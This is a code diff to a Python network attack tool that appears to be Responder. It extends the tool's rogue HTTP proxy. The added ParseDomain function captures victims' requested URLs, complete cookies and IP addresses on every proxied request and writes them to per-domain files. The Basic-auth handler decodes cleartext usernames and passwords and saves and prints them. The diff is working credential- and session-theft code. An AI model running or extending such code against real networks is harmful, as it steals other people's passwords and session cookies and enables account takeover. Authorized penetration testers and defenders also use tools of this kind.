@@ -16,7 +16,7 @@
 # You should have received a copy of the GNU General Public License
 # along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random
+import sys,struct,SocketServer,re,optparse,socket,thread,Fingerprint,random,os
 from Fingerprint import RunSmbFinger,OsNameClientVersion
 from odict import OrderedDict
 from socket import inet_aton
@@ -880,7 +880,6 @@ def Basic_Ntlm(Basic):
 def PacketSequence(data,client):
     a = re.findall('(?<=Authorization: NTLM )[^\\r]*', data)
     b = re.findall('(?<=Authorization: Basic )[^\\r]*', data)
-
     if a:
        packetNtlm = b64decode(''.join(a))[8:9]
        if packetNtlm == "\x01":
@@ -933,21 +932,53 @@ class HTTP(SocketServer.BaseRequestHandler):
 ##################################################################################
 
 def GrabHost(data,host):
-    Host = re.findall('(?<=GET )[^HTTP]*', data)
-    if Host:
-          HostStr = "[+]HTTP Proxy sent from: %s The requested URL was: %s"%(host,''.join(Host))
+    GET = re.findall('(?<=GET )[^HTTP]*', data)
+    CONNECT = re.findall('(?<=CONNECT )[^HTTP]*', data)
+    POST = re.findall('(?<=POST )[^HTTP]*', data)
+    if GET:
+          HostStr = "[+]HTTP Proxy sent from: %s The requested URL was: %s"%(host,''.join(GET))
           logging.warning(HostStr)
           print HostStr
-          return ''.join(Host)
+          return ''.join(GET)
+    if CONNECT:
+          Host2Str = "[+]HTTP Proxy sent from: %s The requested URL was: %s"%(host,''.join(CONNECT))
+          logging.warning(Host2Str)
+          print Host2Str
+          return ''.join(CONNECT)
+    if POST:
+          Host3Str = "[+]HTTP Proxy sent from: %s The requested URL was: %s"%(host,''.join(POST))
+          logging.warning(Host3Str)
+          print Host3Str
+          return ''.join(POST)
     else:
           NoHost = "[+]No host url sent with this request"
           logging.warning(NoHost)
+          return "NO HOST"
+
+def HostDidntAuthBefore(client):
+    f = os.path.exists("HTTP-NTLMv2-Client-"+client+".txt")
+    if f:
+       return False
+    else:
+       return True
 
 def ProxyBasic_Ntlm(Basic):
     if Basic == "1":
        return IIS_Basic_407_Ans()
     if Basic == "0":
        return IIS_Auth_407_Ans()
+
+def ParseDomain(data,client):
+    Host = GrabHost(data,client)
+    Cookie = GrabCookie(data,client)
+    Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s"%(Host, Cookie, client)
+    DomainName = re.search('^(.*:)//([a-z\-.]+)(:[0-9]+)?(.*)$', Host)
+    if DomainName:
+       OutFile = "HTTPCookies/HTTP-Cookie-"+DomainName.group(2)+"-"+client+".txt"
+       WriteData(OutFile,Message)
+    else:
+       OutFile = "HTTPCookies/HTTP-Cookie-"+Host+"-"+client+".txt"
+       WriteData(OutFile,Message)
 
 #Handle HTTP packet sequence.
 def ProxyPacketSequence(data,client):
@@ -956,12 +987,6 @@ def ProxyPacketSequence(data,client):
     if a:
        packetNtlm = b64decode(''.join(a))[8:9]
        if packetNtlm == "\x01":
-          Host = GrabHost(data,client)
-          Cookie = GrabCookie(data,client)
-          DomainName = re.search('^(.*:)//([a-z\-.]+)(:[0-9]+)?(.*)$', Host)
-          Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s"%(Host, Cookie, client)
-          OutFile = "HTTPCookies/HTTP-Cookie-"+DomainName.group(2)+"-"+client+".txt"
-          WriteData(OutFile,Message)
           r = NTLM_Challenge(ServerChallenge=Challenge)
           r.calculate()
           t = IIS_407_NTLM_Challenge_Ans()
@@ -975,20 +1000,13 @@ def ProxyPacketSequence(data,client):
           buffer1.calculate()
           return str(buffer1)
     if b:
-       Host = GrabHost(data,client)
-       Cookie = GrabCookie(data,client)
-       DomainName = re.search('^(.*:)//([a-z\-.]+)(:[0-9]+)?(.*)$', Host)
-       Message = "Requested URL: %s\nComplete Cookie: %s\nClient IP is: %s"%(Host, Cookie, client)
-       OutFile = "HTTPCookies/HTTP-Cookie-"+DomainName.group(2)+"-"+client+".txt"
-       WriteData(OutFile,Message)
-       outfile = "HTTP-Clear-Text-Password-"+client+".txt"
+       outfile = "HTTP-Proxy-Clear-Text-Password-"+client+".txt"
        WriteData(outfile,b64decode(''.join(b)))
-       print "[+]HTTP-User & Password:", b64decode(''.join(b))
-       logging.warning('[+]HTTP-User & Password: %s'%(b64decode(''.join(b))))
+       print "[+][Proxy]HTTP-User & Password:", b64decode(''.join(b))
+       logging.warning('[+][Proxy]HTTP-User & Password: %s'%(b64decode(''.join(b))))
        buffer1 = DitchThisConnection()
        buffer1.calculate()
        return str(buffer1)
-
     else:
        return str(ProxyBasic_Ntlm(Basic))
 
@@ -1004,8 +1022,10 @@ class HTTPProxy(SocketServer.BaseRequestHandler):
            self.request.settimeout(0.1)
            for x in range(2):
              data = self.request.recv(8092)
+             ParseDomain(data,self.client_address[0])
              buffer0 = ProxyPacketSequence(data,self.client_address[0])      
              self.request.send(buffer0)
+
         except Exception:
            pass#No need to be verbose..
            self.request.close()
